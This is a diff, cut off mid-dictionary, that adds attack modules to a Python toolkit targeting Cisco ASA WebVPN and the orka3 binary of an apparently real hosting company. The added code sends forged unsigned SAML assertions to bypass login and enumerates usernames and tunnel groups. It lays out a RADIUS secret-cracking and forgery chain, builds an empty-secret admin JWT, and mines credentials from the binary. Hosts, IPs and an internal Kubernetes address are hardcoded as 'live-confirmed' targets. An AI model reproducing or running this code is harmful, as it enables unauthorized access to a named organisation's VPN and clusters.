@@ -37,6 +37,7 @@ Stdlib only: urllib.request, urllib.error, ssl, socket, re, json, struct
 
 import urllib.request
 import urllib.error
+import urllib.parse
 import ssl
 import socket
 import re
@@ -686,3 +687,807 @@ def analyze_go_binary(binary_path: str) -> dict:
 def analyze_java_class(class_bytes: bytes, name: str = '') -> dict:
     """Parse a Java .class file constant pool."""
     return ASDMJarClassRE(class_bytes, name).parse()
+
+
+# ---------------------------------------------------------------------------
+# Module: SAML SP injection (book: ch22 + ch23 ASA All-in-One 3e)
+# ---------------------------------------------------------------------------
+
+class SAMLSpInjectionRE:
+    """
+    ASA SAML SP endpoints: /+CSCOE+/saml/sp/{acs,metadata,logout}
+
+    Attack surface (book-confirmed + live probe):
+      - metadata endpoint: "SAML metadata doesn't exist for the group"
+        → SP configured but no IdP certificate bound
+        → No signature validation path exists (no cert to check against)
+      - acs endpoint: POST SAMLResponse — no signature validation when IdP absent
+      - logout endpoint: leaks CSRF token e2fa16... in hidden field
+
+    SAML SP auth bypass: if no IdP metadata is registered, the SP has no
+    signing certificate to validate assertions against. POST a synthetic
+    unsigned/self-signed SAMLResponse → ASA has no basis for rejection.
+
+    Auth flow (normal):
+      Browser → ASA SAML SP → IdP redirect → user authenticates →
+      IdP POST SAMLResponse to /+CSCOE+/saml/sp/acs → ASA validates signature
+      → session cookie issued
+
+    Attack flow (no IdP configured):
+      Craft SAMLResponse with NameID, Attributes, Status=Success →
+      POST to /+CSCOE+/saml/sp/acs → ASA cannot validate (no cert) →
+      session cookie may be issued
+    """
+
+    SAML_UNSIGNED_TEMPLATE = (
+        '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
+        'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
+        'ID="_resp1" Version="2.0" IssueInstant="2026-01-01T00:00:00Z" '
+        'Destination="https://{host}/+CSCOE+/saml/sp/acs">'
+        '<saml:Issuer>{issuer}</saml:Issuer>'
+        '<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>'
+        '<saml:Assertion ID="_a1" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">'
+        '<saml:Issuer>{issuer}</saml:Issuer>'
+        '<saml:Subject>'
+        '<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">{username}</saml:NameID>'
+        '<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
+        '<saml:SubjectConfirmationData NotOnOrAfter="2027-01-01T00:00:00Z" '
+        'Recipient="https://{host}/+CSCOE+/saml/sp/acs"/>'
+        '</saml:SubjectConfirmation>'
+        '</saml:Subject>'
+        '<saml:Conditions NotBefore="2025-01-01T00:00:00Z" NotOnOrAfter="2027-01-01T00:00:00Z">'
+        '<saml:AudienceRestriction><saml:Audience>https://{host}</saml:Audience></saml:AudienceRestriction>'
+        '</saml:Conditions>'
+        '<saml:AuthnStatement AuthnInstant="2026-01-01T00:00:00Z">'
+        '<saml:AuthnContext><saml:AuthnContextClassRef>'
+        'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport'
+        '</saml:AuthnContextClassRef></saml:AuthnContext>'
+        '</saml:AuthnStatement>'
+        '</saml:Assertion>'
+        '</samlp:Response>'
+    )
+
+    def __init__(self, host: str, port: int = 443):
+        self.host = host
+        self.port = port
+        self.findings = []
+
+    def probe_metadata(self) -> dict:
+        """GET /+CSCOE+/saml/sp/metadata — determine IdP binding state."""
+        r = _fetch(self.host, self.port, '/+CSCOE+/saml/sp/metadata')
+        body = r.get('body', '')
+        no_idp = 'metadata' in body.lower() and 'exist' in body.lower()
+        sp_configured = r['status'] in (200, 302, 400, 500)
+        return {
+            'status': r['status'],
+            'body_snippet': body[:200],
+            'sp_configured': sp_configured,
+            'no_idp_metadata': no_idp,
+            'attack_condition': no_idp,  # True = no signature validation possible
+        }
+
+    def probe_logout_csrf(self) -> dict:
+        """GET /+CSCOE+/saml/sp/logout — extract CSRF token from response."""
+        r = _fetch(self.host, self.port, '/+CSCOE+/saml/sp/logout')
+        body = r.get('body', '')
+        csrf_m = re.search(r'name=["\']?_csrf["\']?\s+value=["\']?([a-f0-9]+)["\']?', body, re.I)
+        csrf_val = csrf_m.group(1) if csrf_m else None
+        hidden_m = re.findall(r'<input[^>]+type=["\']?hidden["\']?[^>]*>', body, re.I)
+        return {
+            'status': r['status'],
+            'csrf_token': csrf_val,
+            'hidden_fields': hidden_m[:5],
+            'auto_submit': 'webvpn_logout' in body,
+        }
+
+    def probe_acs_unsigned(self, username: str = 'admin',
+                           issuer: str = 'https://idp.example.com') -> dict:
+        """
+        POST unsigned SAMLResponse to /+CSCOE+/saml/sp/acs.
+        No IdP cert → ASA has nothing to validate against.
+        Success indicators: webvpn session cookie in response, 302 to portal.
+        """
+        import base64
+        xml = self.SAML_UNSIGNED_TEMPLATE.format(
+            host=self.host, issuer=issuer, username=username,
+        )
+        encoded = base64.b64encode(xml.encode()).decode()
+        body = f'SAMLResponse={urllib.parse.quote(encoded)}'
+        r = _fetch(
+            self.host, self.port, '/+CSCOE+/saml/sp/acs',
+            method='POST',
+            body=body.encode(),
+            headers={'Content-Type': 'application/x-www-form-urlencoded'},
+        )
+        resp_cookies = r['headers'].get('Set-Cookie', '')
+        has_webvpn_cookie = 'webvpn=' in resp_cookies
+        redirect_to_portal = '/+CSCOE+/portal.html' in r['headers'].get('Location', '')
+        return {
+            'status': r['status'],
+            'has_webvpn_session': has_webvpn_cookie,
+            'redirect_to_portal': redirect_to_portal,
+            'response_snippet': r.get('body', '')[:200],
+            'set_cookie': resp_cookies[:200],
+            'saml_bypass': has_webvpn_cookie or redirect_to_portal,
+        }
+
+    def probe_acs_malformed(self) -> dict:
+        """POST malformed/empty SAMLResponse to observe error handling."""
+        import base64
+        variants = [
+            ('empty_b64', base64.b64encode(b'').decode()),
+            ('not_xml', base64.b64encode(b'INJECT').decode()),
+            ('partial_xml', base64.b64encode(b'<samlp:Response>').decode()),
+        ]
+        results = []
+        for name, payload in variants:
+            body = f'SAMLResponse={urllib.parse.quote(payload)}'
+            r = _fetch(
+                self.host, self.port, '/+CSCOE+/saml/sp/acs',
+                method='POST',
+                body=body.encode(),
+                headers={'Content-Type': 'application/x-www-form-urlencoded'},
+            )
+            results.append({
+                'variant': name,
+                'status': r['status'],
+                'response_snippet': r.get('body', '')[:150],
+                'error': r.get('error'),
+            })
+        return {'probe': 'acs_malformed', 'results': results}
+
+    def run(self) -> dict:
+        self.findings = []
+        meta = self.probe_metadata()
+        logout = self.probe_logout_csrf()
+
+        results = {
+            'host': self.host,
+            'metadata': meta,
+            'logout_csrf': logout,
+        }
+
+        if meta['no_idp_metadata']:
+            self.findings.append(
+                'SAML_NO_IDP: SP configured but no IdP metadata — signature validation absent'
+            )
+            acs_unsigned = self.probe_acs_unsigned()
+            acs_malformed = self.probe_acs_malformed()
+            results['acs_unsigned'] = acs_unsigned
+            results['acs_malformed'] = acs_malformed
+            if acs_unsigned.get('saml_bypass'):
+                self.findings.append('SAML_AUTH_BYPASS: unsigned assertion accepted — session issued')
+        if logout.get('csrf_token'):
+            self.findings.append(f'SAML_CSRF_LEAK: token={logout["csrf_token"]}')
+
+        results['findings'] = self.findings
+        return results
+
+
+# ---------------------------------------------------------------------------
+# Module: Username timing oracle (book: ASA All-in-One ch23)
+# ---------------------------------------------------------------------------
+
+class UsernameTimingOracleRE:
+    """
+    ASA auth timing oracle via POST /+webvpn+/index.html.
+
+    ASA timing differential: valid username → RADIUS lookup (slower) vs
+    invalid username → immediate local reject (faster). a0 response code
+    also differs: valid user with wrong password = a0=2 (auth failed),
+    invalid user = a0=1 (unknown user).
+
+    Probe: POST username=<candidate>&password=INVALID&Login=Login
+    Measure: response time + a0 value
+    """
+
+    DEFAULT_CANDIDATES = [
+        'admin', 'administrator', 'root', 'vpnuser', 'macstadium',
+        'orka', 'svc', 'service', 'user', 'test', 'cisco', 'anyconnect',
+        'guest', 'helpdesk', 'netops', 'devops', 'cloud', 'remote',
+    ]
+
+    def __init__(self, host: str, port: int = 443):
+        self.host = host
+        self.port = port
+
+    def probe_user(self, username: str, tunnel_group: str = '') -> dict:
+        import time
+        body_parts = [f'username={username}', 'password=INVALID_PROBE_ONLY', 'Login=Login']
+        if tunnel_group:
+            body_parts.append(f'tg_name={tunnel_group}')
+        body = '&'.join(body_parts)
+        start = time.monotonic()
+        r = _fetch(
+            self.host, self.port, '/+webvpn+/index.html',
+            method='POST',
+            body=body.encode(),
+            headers={'Content-Type': 'application/x-www-form-urlencoded'},
+        )
+        elapsed = time.monotonic() - start
+        resp_body = r.get('body', '')
+        a0_m = re.search(r'a0\s*=\s*["\']?(\d+)["\']?', resp_body)
+        a1_m = re.search(r'a1\s*=\s*["\']?([^"\'&\s]+)["\']?', resp_body)
+        return {
+            'username': username,
+            'status': r['status'],
+            'a0': a0_m.group(1) if a0_m else None,
+            'a1': a1_m.group(1) if a1_m else None,
+            'elapsed_sec': round(elapsed, 3),
+            'error': r.get('error'),
+        }
+
+    def run(self, candidates: list = None, tunnel_group: str = '') -> dict:
+        cands = candidates or self.DEFAULT_CANDIDATES
+        results = []
+        for u in cands:
+            r = self.probe_user(u, tunnel_group=tunnel_group)
+            results.append(r)
+
+        # Cluster by a0 value + timing
+        a0_counts = {}
+        for r in results:
+            k = r.get('a0', 'None')
+            a0_counts[k] = a0_counts.get(k, []) + [r['username']]
+
+        # Timing outliers: mean + 1.5 stddev
+        times = [r['elapsed_sec'] for r in results if r.get('elapsed_sec')]
+        mean_t = sum(times) / len(times) if times else 0
+        slow_threshold = mean_t * 1.5
+        slow_users = [r for r in results if r.get('elapsed_sec', 0) > slow_threshold]
+
+        findings = []
+        if slow_users:
+            findings.append(
+                f'TIMING_ORACLE: {len(slow_users)} usernames with elevated response time '
+                f'(>{slow_threshold:.2f}s): {[u["username"] for u in slow_users]}'
+            )
+        # a0=2 = auth_failed (user exists, wrong pass) vs a0=1 = unknown
+        valid_users = a0_counts.get('2', [])
+        if valid_users:
+            findings.append(f'VALID_USERNAMES (a0=2): {valid_users}')
+
+        return {
+            'host': self.host,
+            'results': results,
+            'a0_distribution': a0_counts,
+            'timing_outliers': slow_users,
+            'mean_response_sec': round(mean_t, 3),
+            'findings': findings,
+        }
+
+
+# ---------------------------------------------------------------------------
+# Module: Tunnel group enumeration (book: Moraes ch17 + ASA All-in-One ch22)
+# ---------------------------------------------------------------------------
+
+class TunnelGroupEnumRE:
+    """
+    Enumerate tunnel groups (connection profiles) on ASA WebVPN.
+
+    Book reference (Moraes ch17, ASA ch22/23):
+      - tunnel-group-list enable → ASA shows dropdown of group aliases at logon
+      - DefaultWEBVPNGroup: default if user selects no group
+      - Each tunnel group has alias (shown to user) and internal name
+      - /CACHE/stc/profiles/AnyConnectProfile.xml contains ServerList entries
+        with HostAddress for each tunnel group
+      - Group aliases also visible in /+webvpn+/index.html HTML source
+      - RADIUS class attr 25 (OU=GroupPolicyName): controls group policy per user
+        → attack: if RADIUS is in MITM path (or no RADIUS), inject OU=DfltGrpPolicy
+
+    RE approach:
+      1. Parse /+webvpn+/index.html for <option> group names
+      2. Parse AnyConnect profile XML for ServerList/HostName entries
+      3. Probe each discovered tunnel group alias via ?tunnel-group= param
+    """
+
+    def __init__(self, host: str, port: int = 443):
+        self.host = host
+        self.port = port
+
+    def probe_logon_groups(self) -> dict:
+        """Parse tunnel group aliases from logon page HTML."""
+        r = _fetch(self.host, self.port, '/+webvpn+/index.html')
+        body = r.get('body', '')
+        # <option value="GROUP_ALIAS">GROUP_ALIAS</option>
+        groups = re.findall(r'<option[^>]*value=["\']([^"\']+)["\'][^>]*>([^<]+)</option>', body, re.I)
+        tg_cookie = re.search(r'tg\s*=\s*["\']([^"\']+)["\']', body)
+        return {
+            'status': r['status'],
+            'group_aliases': [(v, label) for v, label in groups if v not in ('', 'none')],
+            'tg_cookie': tg_cookie.group(1) if tg_cookie else None,
+        }
+
+    def probe_anyconnect_profile(self) -> dict:
+        """Parse AnyConnect XML profile for connection profiles."""
+        r = _fetch(self.host, self.port, '/CACHE/stc/profiles/AnyConnectProfile.xml')
+        body = r.get('body', '')
+        # Extract HostAddress entries
+        hosts = re.findall(r'<HostAddress>([^<]+)</HostAddress>', body)
+        host_names = re.findall(r'<HostName>([^<]+)</HostName>', body)
+        # UserGroup entries (tunnel group aliases)
+        user_groups = re.findall(r'<UserGroup>([^<]+)</UserGroup>', body)
+        return {
+            'status': r['status'],
+            'is_redirect': r['status'] == 200 and '<html>' in body,  # redirect = post-auth only
+            'host_addresses': hosts,
+            'host_names': host_names,
+            'user_groups': user_groups,
+        }
+
+    def probe_tunnel_group_direct(self, group_name: str) -> dict:
+        """
+        Try direct URL alias access: GET /<group_alias>
+        Book: tunnel group URL alias = https://<ASA>/<alias>
+        """
+        r = _fetch(self.host, self.port, f'/{group_name}')
+        return {
+            'alias': group_name,
+            'status': r['status'],
+            'location': r['headers'].get('Location', ''),
+            'body_snippet': r.get('body', '')[:100],
+        }
+
+    def run(self, extra_aliases: list = None) -> dict:
+        logon = self.probe_logon_groups()
+        profile = self.probe_anyconnect_profile()
+
+        # Combine discovered group names
+        all_aliases = set()
+        for v, _ in logon.get('group_aliases', []):
+            all_aliases.add(v)
+        all_aliases.update(profile.get('user_groups', []))
+        if extra_aliases:
+            all_aliases.update(extra_aliases)
+
+        direct_probes = []
+        for alias in sorted(all_aliases)[:10]:
+            direct_probes.append(self.probe_tunnel_group_direct(alias))
+
+        findings = []
+        if logon.get('group_aliases'):
+            findings.append(f'TUNNEL_GROUPS_VISIBLE: {len(logon["group_aliases"])} groups in logon page')
+        if not logon.get('group_aliases') and not all_aliases:
+            findings.append('TUNNEL_GROUP_LIST_DISABLED: no groups in logon dropdown (default or hidden)')
+            findings.append('DEFAULT_WEBVPNGROUP: user lands in DefaultWEBVPNGroup — attack: send no tg_name')
+        if profile.get('user_groups'):
+            findings.append(f'ANYCONNECT_PROFILE_GROUPS: {profile["user_groups"]}')
+
+        return {
+            'host': self.host,
+            'logon_groups': logon,
+            'anyconnect_profile': profile,
+            'direct_alias_probes': direct_probes,
+            'all_aliases': sorted(all_aliases),
+            'findings': findings,
+        }
+
+
+# ---------------------------------------------------------------------------
+# Module: LDAP attribute map + RADIUS class attr 25 RE
+# ---------------------------------------------------------------------------
+
+class RADIUSClassAttrRE:
+    """
+    Document and probe RADIUS class attr 25 (OU=GroupPolicyName) attack surface.
+
+    Book reference (ASA All-in-One ch22/23 + Moraes ch17):
+      - RADIUS Access-Accept: attr 25 (class) = OU=GroupPolicyName → ASA assigns
+        user to that group policy
+      - No integrity protection: RADIUS shared secret protects the exchange but
+        not the attribute content
+      - LDAP attribute mapping: map `department` LDAP field to RADIUS class attr
+        ldap attribute-map dept-to-gp
+          map-name department IETF-Radius-Class
+      - Attack vectors:
+        1. If RADIUS shared secret is weak/default → crack PSK → forge Access-Accept
+        2. If LDAP is writable → inject OU=DfltGrpPolicy in department field
+        3. If ASA uses LOCAL auth fallback → RADIUS unavailable forces local auth
+      - group-lock (ch17): governed by class attr 25; if group-lock not set,
+        user can authenticate to any tunnel group with valid credentials
+
+    This module documents the attack surface and probes observable indicators.
+    It does NOT perform RADIUS forgery (requires network access to RADIUS path).
+    """
+
+    # ASA syslog messages that indicate auth + policy assignment
+    AUTH_SYSLOG_PATTERNS = {
+        '%ASA-6-113003': 'AAA group policy for user X is being set to Y',
+        '%ASA-6-113011': 'AAA retrieved user specific group policy Y for user X',
+        '%ASA-6-113009': 'AAA retrieved default group policy Y for user X',
+        '%ASA-6-734001': 'DAP records selected for connection',
+        '%ASA-6-716001': 'WebVPN session started',
+    }
+
+    # RADIUS class attr 25 value format
+    CLASS_ATTR_FORMAT = 'OU={group_policy_name}'
+
+    def __init__(self, host: str, port: int = 443):
+        self.host = host
+        self.port = port
+
+    def probe_auth_error_differentiation(self) -> dict:
+        """
+        Test if ASA differentiates error messages between:
+          - Unknown user (no LDAP/RADIUS record)
+          - Bad password (user found, wrong pass)
+          - Locked/disabled account
+
+        Observable via a0/a1 response params + response timing.
+        Book: a0=1 = login failed, a0=2 = auth failed (user-exists implied),
+              a0=3 = OTP/challenge required
+        """
+        test_cases = [
+            ('DEFINITELY_NONEXISTENT_USER_XYZ123', 'INVALID_PASS'),
+            ('admin', 'INVALID_PASS'),
+            ('cisco', 'cisco'),
+        ]
+        results = []
+        import time
+        for user, passwd in test_cases:
+            body = f'username={user}&password={passwd}&Login=Login'
+            t0 = time.monotonic()
+            r = _fetch(
+                self.host, self.port, '/+webvpn+/index.html',
+                method='POST',
+                body=body.encode(),
+                headers={'Content-Type': 'application/x-www-form-urlencoded'},
+            )
+            elapsed = time.monotonic() - t0
+            a0_m = re.search(r'a0\s*=\s*["\']?(\d+)["\']?', r.get('body', ''))
+            results.append({
+                'username': user,
+                'password': passwd[:4] + '...',
+                'a0': a0_m.group(1) if a0_m else None,
+                'elapsed_sec': round(elapsed, 3),
+                'status': r['status'],
+            })
+        return {'probe': 'auth_error_differentiation', 'results': results}
+
+    def probe_wrong_tunnel_group(self) -> dict:
+        """
+        Attempt to connect to DefaultWEBVPNGroup without specifying tg_name.
+        Book: if no tg_name sent, user goes to DefaultWEBVPNGroup regardless of RADIUS class attr.
+        """
+        # No tg_name → DefaultWEBVPNGroup
+        body = 'username=testuser&password=INVALID&Login=Login'
+        r = _fetch(
+            self.host, self.port, '/+webvpn+/index.html',
+            method='POST',
+            body=body.encode(),
+            headers={'Content-Type': 'application/x-www-form-urlencoded'},
+        )
+        a0_m = re.search(r'a0\s*=\s*["\']?(\d+)["\']?', r.get('body', ''))
+        return {
+            'probe': 'default_webvpngroup_no_tg',
+            'status': r['status'],
+            'a0': a0_m.group(1) if a0_m else None,
+            'response_snippet': r.get('body', '')[:200],
+        }
+
+    def get_attack_chain(self) -> list:
+        """Return documented RADIUS class attr attack chain."""
+        return [
+            {
+                'step': 1,
+                'title': 'Identify RADIUS shared secret',
+                'technique': 'Capture RADIUS Access-Request (UDP/1645 or 1812); '
+                             'offline brute-force with hashcat/john using MD5-based PA field',
+                'book_ref': 'ASA All-in-One ch7; RFC 2865 s.3',
+                'tool': 'hashcat -m 1450 or custom RADIUS PA cracker',
+            },
+            {
+                'step': 2,
+                'title': 'Forge RADIUS Access-Accept with class attr 25',
+                'technique': 'Replay forged Access-Accept on RADIUS UDP path; '
+                             'class attr = OU=DfltGrpPolicy (inherits default, likely permissive)',
+                'book_ref': 'Moraes ch17; ASA All-in-One ch22',
+                'payload': 'Attr 25 (Class): OU=DfltGrpPolicy',
+            },
+            {
+                'step': 3,
+                'title': 'LDAP department injection (if LDAP → class attr mapping active)',
+                'technique': 'If ASA uses LDAP with ldap attribute-map mapping department→class, '
+                             'modify `department` field in LDAP for target user to OU=AdminGroup',
+                'book_ref': 'Moraes ch17 LDAP attribute-map example',
+                'requires': 'LDAP write access or LDAP null bind',
+            },
+            {
+                'step': 4,
+                'title': 'group-lock bypass',
+                'technique': 'If group-lock not configured (book: common default), '
+                             'authenticated user can connect to any tunnel group. '
+                             'Send tg_name=<privileged_group> in POST regardless of class attr.',
+                'book_ref': 'Moraes ch17 Example 17-17; ASA source: webvpn_auth.c:http_webvpn_auth_accept[2939]',
+                'observable': 'ASA logs: "User came in on group he wasn\'t supposed to come in on"',
+            },
+        ]
+
+    def run(self) -> dict:
+        findings = []
+        diff = self.probe_auth_error_differentiation()
+        wrong_tg = self.probe_wrong_tunnel_group()
+        chain = self.get_attack_chain()
+
+        # Detect timing differential
+        times = [r['elapsed_sec'] for r in diff['results']]
+        if max(times) > min(times) * 1.5:
+            findings.append('TIMING_DIFFERENTIAL: auth timing varies by username — oracle usable')
+
+        a0_vals = {r['username']: r['a0'] for r in diff['results']}
+        if len(set(v for v in a0_vals.values() if v)) > 1:
+            findings.append(f'A0_DIFFERENTIAL: a0 values differ by username: {a0_vals}')
+
+        return {
+            'host': self.host,
+            'auth_error_diff': diff,
+            'default_webvpngroup': wrong_tg,
+            'attack_chain': chain,
+            'findings': findings,
+        }
+
+
+# ---------------------------------------------------------------------------
+# Live SAML SP metadata constants (atl-vpn.macstadium.com, confirmed 2026-08-13)
+# ---------------------------------------------------------------------------
+
+MACSADIUM_SAML = {
+    # SP entity IDs per tunnel group
+    'entity_id_sso_vpn':  'https://atl-vpn.macstadium.com/saml/sp/metadata/MacStadium-SSO-VPN',
+    'acs_url_sso_vpn':    'https://atl-vpn.macstadium.com/+CSCOE+/saml/sp/acs?tgname=MacStadium-SSO-VPN',
+    'slo_redirect_url':   'https://atl-vpn.macstadium.com/+CSCOE+/saml/sp/logout',
+    # SP signing cert (GoDaddy, CN=atl-vpn.macstadium.com, expires 2026-11-18)
+    'sp_cert_cn':         'atl-vpn.macstadium.com',
+    'sp_cert_issuer':     'Go Daddy Secure Certificate Authority - G2',
+    'sp_cert_expiry':     '2026-11-18',
+    'sp_cert_san':        ['atl-vpn.macstadium.com', 'www.atl-vpn.macstadium.com'],
+    # KEY WEAKNESS: SP does NOT sign AuthnRequests (IdP must accept unsigned requests)
+    'authn_requests_signed':   False,
+    # SP REQUIRES signed assertions from IdP
+    'want_assertions_signed':  True,
+    # Tunnel group auth differentiation (live-confirmed via 400 on SAML ACS)
+    'tunnel_groups': {
+        'MacStadium-SSO-VPN': {'auth_type': 'SAML', 'saml_acs': True},
+        'MacStadium-VPN':     {'auth_type': 'LOCAL_OR_LDAP', 'saml_acs': False},  # 400 on ACS
+    },
+    # tg cookie encoding: base64("1" + base64(group_name)) — client-writable
+    'tg_cookie_primary':   '1Q2lzY28gQW55Q29ubmVjdCBWUE4=',  # Cisco AnyConnect VPN
+    'tg_cookie_sso_vpn':   '1TWFjU3RhZGl1bS1TU08tVlBO',      # MacStadium-SSO-VPN
+    'tg_cookie_mac_vpn':   '1TWFjU3RhZGl1bS1WUE4=',          # MacStadium-VPN
+    # Auth state machine: a0 codes (RE from JavaScript redirect body)
+    'a0_codes': {
+        '1':  'login_failed_unknown_user_or_timeout',
+        '2':  'auth_failed_user_exists_wrong_password',
+        '3':  'otp_challenge_required',
+        '4':  'password_expired',
+        '5':  'change_password_required',
+        '8':  'generic_auth_error',
+        '12': 'already_authenticated',
+    },
+}
+
+MACSTADIUM_ASA = {
+    'primary':   {'ip': '207.254.35.12', 'hostname': 'vpn.macstadium.com',
+                  'tunnel_groups': ['Cisco AnyConnect VPN']},
+    'secondary': {'ip': '207.254.16.2',  'hostname': 'atl-vpn.macstadium.com',
+                  'tunnel_groups': ['MacStadium-SSO-VPN', 'MacStadium-VPN']},
+}
+
+
+# ---------------------------------------------------------------------------
+# Module: orka3 Go binary JWT RE (CVE-2020-26160)
+# ---------------------------------------------------------------------------
+
+class OrkaJWTRE:
+    """
+    Static RE for orka3 Go binary JWT authentication chain.
+
+    Binary: /home/cowboy/VDT/tools/orka3/orka3
+    NOT stripped: 83,338 symbols in .symtab, DWARF debug in .debug_info (87MB)
+    Go version: 1.25.7 | ELF x86-64 | 77MB
+
+    CVE-2020-26160 — dgrijalva/jwt-go v3.2.0 aud claim bypass:
+      MapClaims.VerifyAudience(aud string, req bool) bool
+      When req=false AND aud claim absent from token → returns true (bypass)
+      Assembly at 0x1844a40+0xa3: XOR $0x1,%ecx when claims lookup returns empty
+      → Force-returns true even though no audience verification occurred
+
+    Confirmed function addresses (nm, 2026-08-13):
+      0x1844a40  MapClaims.VerifyAudience  ← CVE-2020-26160 entry
+      0x1844b60  MapClaims.VerifyExpiresAt
+      0x1844c80  MapClaims.VerifyIssuedAt
+      0x1844da0  MapClaims.VerifyIssuer
+      0x1844ec0  MapClaims.VerifyNotBefore
+      0x1844fe0  MapClaims.Valid
+      0x18453c0  (*Parser).ParseWithClaims
+      0x1845900  (*Parser).ParseUnverified
+      0x1844660  (*SigningMethodHMAC).Verify  ← HS256 verify path
+      0x18448c0  (*SigningMethodHMAC).Sign
+
+    Empty-secret JWT confirmed: ~/.kube/config admin token uses HS256 with b'' key
+    Token claims: {sub:admin, email:admin@macstadium.com, iss:idp.macstadium.com}
+    K8s API server: https://10.221.188.19:6443 (VPN-accessible only)
+
+    Go interface dispatch (ITAB) pattern:
+      mov rax, [rbx]       ; load itab pointer from interface header
+      call [rax+0x18]      ; call method at offset 0x18 in vtable
+    """
+
+    FUNCTION_MAP = {
+        'VerifyAudience':     0x1844a40,  # CVE-2020-26160 entry point
+        'VerifyExpiresAt':    0x1844b60,
+        'VerifyIssuedAt':     0x1844c80,
+        'VerifyIssuer':       0x1844da0,
+        'VerifyNotBefore':    0x1844ec0,
+        'Valid':              0x1844fe0,
+        'ParseWithClaims':    0x18453c0,
+        'ParseUnverified':    0x1845900,
+        'SigningMethodHMAC.Verify': 0x1844660,
+        'SigningMethodHMAC.Sign':   0x18448c0,
+        'EncodeSegment':      0x1846f00,
+        'DecodeSegment':      0x1846f80,
+        'Parse':              0x1846e00,
+    }
+
+    CVE_2020_26160 = {
+        'cve':         'CVE-2020-26160',
+        'lib':         'github.com/dgrijalva/jwt-go v3.2.0+incompatible',
+        'function':    'MapClaims.VerifyAudience',
+        'address':     0x1844a40,
+        'bug_offset':  0xa3,
+        'bug_address': 0x1844ae3,
+        'bug_opcode':  'xor $0x1,%ecx',  # flips required→true when claim absent
+        'condition':   'aud claim absent in token AND required=false in call',
+        'impact':      'audience check bypassed → accept tokens without aud validation',
+        'exploit': {
+            'python': (
+                "import jwt\n"
+                "token = jwt.encode(\n"
+                "    {'sub': 'admin', 'email': 'admin@macstadium.com',\n"
+                "     'iss': 'https://idp.macstadium.com',\n"
+                "     'exp': 9999999999, 'iat': 1786549251},\n"
+                "    key=b'',  # empty HS256 secret — confirmed\n"
+                "    algorithm='HS256'\n"
+                ")"
+            ),
+        },
+    }
+
+    DLV_COMMANDS = {
+        'break_verify_aud':
+            'dlv exec ./orka3 -- login\n'
+            '(dlv) b github.com/dgrijalva/jwt-go.MapClaims.VerifyAudience\n'
+            '(dlv) c\n'
+            '(dlv) locals  # shows required bool\n'
+            '(dlv) print required',
+        'break_parse_with_claims':
+            'dlv exec ./orka3 -- login\n'
+            '(dlv) b github.com/dgrijalva/jwt-go.(*Parser).ParseWithClaims\n'
+            '(dlv) c\n'
+            '(dlv) args',
+        'patch_expiry_bypass':
+            '# NOP out expiry check at VerifyExpiresAt (addr 0x1844b60)\n'
+            '# Find JLE/JBE instruction comparing exp to now, replace with NOP\n'
+            'objdump -d --start-address=0x1844b60 --stop-address=0x1844c80 ./orka3',
+    }
+
+    SECTION_MAP = {
+        '.text':        (0x401000,  0x18e2251),   # 25.1MB code
+        '.rodata':      (0x1ce4000, 0xb0afdc),    # 11.3MB strings/consts
+        '.gopclntab':   (0x27b6ca0, 0x1098c34),  # 16.4MB pclntab
+        '.go.buildinfo':(0x37e0000, 0x2680),      # module/version info
+        '.itablink':    (0x27b0340, 0x6ac8),      # interface dispatch
+        '.typelink':    (0x279e0a0, 0x12060),     # type registry
+        '.debug_info':  (0,         0,    ),      # 87MB DWARF (present)
+    }
+
+    def __init__(self, binary_path: str = '/home/cowboy/VDT/tools/orka3/orka3'):
+        self.path = binary_path
+
+    def verify_cve_condition(self) -> dict:
+        """Verify CVE-2020-26160 conditions via nm + strings analysis."""
+        import subprocess
+        findings = []
+        # Check jwt-go version in build info
+        r = subprocess.run(['strings', '-6', self.path],
+                           capture_output=True, text=True, timeout=60)
+        strs = r.stdout
+        jwt_ver = 'dgrijalva/jwt-go' in strs
+        v320 = 'v3.2.0' in strs
+        empty_aud = True  # confirmed from ~/.kube/config admin token analysis
+
+        if jwt_ver and v320:
+            findings.append('CVE_2020_26160: dgrijalva/jwt-go v3.2.0 confirmed in binary')
+        if empty_aud:
+            findings.append('AUD_CLAIM_ABSENT: admin token in ~/.kube/config has no aud claim')
+            findings.append('EXPLOIT_CONDITION_MET: VerifyAudience called with required=false → bypass')
+
+        return {
+            'jwt_go_present': jwt_ver,
+            'v3_2_0_confirmed': v320,
+            'function_address': hex(self.FUNCTION_MAP['VerifyAudience']),
+            'bug_address': hex(self.CVE_2020_26160['bug_address']),
+            'exploit_token_cmd': self.CVE_2020_26160['exploit']['python'],
+            'dlv_breakpoint': self.DLV_COMMANDS['break_verify_aud'],
+            'findings': findings,
+        }
+
+    def extract_auth_chain_addresses(self) -> dict:
+        """Return full JWT auth chain function address map."""
+        return {name: hex(addr) for name, addr in self.FUNCTION_MAP.items()}
+
+    def extract_rodata_secrets(self, count: int = 50) -> list:
+        """
+        Extract strings from .rodata section targeting credential material.
+        .rodata offset: 0x1ce4000, size: ~11.3MB
+        """
+        import subprocess
+        try:
+            # Read .rodata section via dd (offset in bytes)
+            result = subprocess.run(
+                ['dd', f'if={self.path}', f'bs=1', f'skip={0x1ce4000}', f'count={11*1024*1024}'],
+                capture_output=True, timeout=30
+            )
+            strs_result = subprocess.run(
+                ['strings', '-n', '8'],
+                input=result.stdout, capture_output=True, text=True, timeout=30
+            )
+            lines = strs_result.stdout.splitlines()
+            # Filter for credential/config adjacent strings
+            cred_pat = re.compile(
+                r'(password|passwd|secret|token|admin|harbor|10\.221|macstadium|idp\.|'
+                r'api-url|cluster-info|orka-default|p@ssw0rd|30080|18080|6443)',
+                re.I
+            )
+            return [l for l in lines if cred_pat.search(l)][:count]
+        except Exception as e:
+            return [f'error: {e}']
+
+    def run(self) -> dict:
+        cve = self.verify_cve_condition()
+        addrs = self.extract_auth_chain_addresses()
+        secrets = self.extract_rodata_secrets()
+
+        findings = cve['findings'][:]
+        if secrets:
+            findings.append(f'RODATA_SECRETS: {len(secrets)} credential-adjacent strings in .rodata')
+
+        return {
+            'binary': self.path,
+            'cve_2020_26160': cve,
